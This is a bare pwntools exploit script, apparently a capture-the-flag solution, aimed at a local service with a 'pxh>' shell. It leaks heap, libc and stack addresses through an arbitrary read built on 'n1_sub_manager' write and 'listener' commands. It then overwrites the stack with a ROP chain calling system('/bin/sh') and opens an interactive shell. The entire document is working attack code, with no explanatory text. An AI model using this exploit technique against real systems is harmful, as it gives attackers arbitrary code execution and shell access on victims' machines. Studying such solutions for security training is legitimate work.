from pwn import *
context.log_level='debug'

p=remote('127.0.0.1', 8080)
p.sendlineafter(b'pxh> ', b'list_tasks')
p.recvuntil(b'hpwork     ')
leak = int(p.recvline())
log.info(hex(leak))

p.sendlineafter(b'pxh> ', b'n1_sub_manager publish 0x24')
p.send(b'\xaa'*0x18)

def leak_addr(addr):
    p.sendlineafter(b'pxh> ', f'n1_sub_manager write 0x24 {hex(addr-0xc)}'.encode())
    p.sendlineafter(b'pxh> ', b'listener debug_key_value')
    p.recvuntil(b'key: "')
    return u64(p.recvuntil(b'"')[:-1].ljust(8, b'\x00'))

leak1 = leak_addr(leak+0x2f8)

log.info(hex(leak1))

libcbase = leak_addr(leak1)-0x4b4720

log.info(hex(libcbase))

leak2 = leak_addr(leak+0x300)

stack = leak_addr(leak2)-0x28

log.info(hex(stack))

ret = libcbase+0x44b3e6
rdi = libcbase+0x44b3e5
bin_sh = libcbase+0x5f9678
system = libcbase+0x471d70

rop = p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)

p.sendlineafter(b'pxh> ', b'n1_sub_manager publish 0x23')
p.send(b'\x00'*0x100)

p.sendlineafter(b'pxh> ', f'n1_sub_manager write 0x23 {hex(stack)}'.encode())

p.sendlineafter(b'pxh> ', b'n1_sub_manager publish 0x23')
p.send(rop.ljust(0x100, b'\x00'))

p.interactive()
